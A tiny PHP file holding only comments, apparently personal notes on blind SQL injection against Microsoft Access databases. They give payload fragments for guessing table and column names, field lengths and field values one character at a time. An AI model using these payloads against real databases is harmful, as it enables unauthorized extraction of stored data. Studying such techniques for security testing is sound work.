<?php
/**
 * Created by PhpStorm.
 * User: haohao
 * Date: 2017/8/30
 * Time: 下午2:21
 */
//Access猜解
//猜表名/字段名 and (select count(*) from table )>=0 / and exists (select * from table)
//猜长度  and(select len(world) from table where id = 1) > 1
//猜字段值 and (select top 1 asc(mid(word, 2, 1)from table))>1
